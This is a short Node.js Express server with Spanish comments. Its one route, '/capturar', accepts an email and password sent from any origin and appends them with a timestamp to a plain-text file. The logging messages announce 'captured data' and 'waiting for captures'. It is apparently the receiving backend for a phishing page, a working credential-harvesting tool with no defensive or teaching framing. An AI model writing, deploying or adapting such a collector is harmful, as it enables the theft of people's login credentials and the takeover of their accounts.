const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Esta es la ruta que recibirá el correo y la clave
app.post('/capturar', (req, res) => {
    const { email, password } = req.body;
    
    // El formato en el que se guardará en el bloque de notas
    const contenido = `CORREO: ${email} | CLAVE: ${password} | FECHA: ${new Date().toLocaleString()}\n`;

    // fs.appendFile escribe en el archivo sin borrar lo anterior
    fs.appendFile('base_de_datos.txt', contenido, (err) => {
        if (err) {
            console.log("Error al escribir el archivo");
            return res.status(500).send("Error");
        }
        console.log(">>> Datos capturados y guardados en base_de_datos.txt");
        res.send("Recibido correctamente");
    });
});

app.listen(3000, () => {
    console.log("Servidor corriendo en http://localhost:3000");
    console.log("Esperando capturas...");
});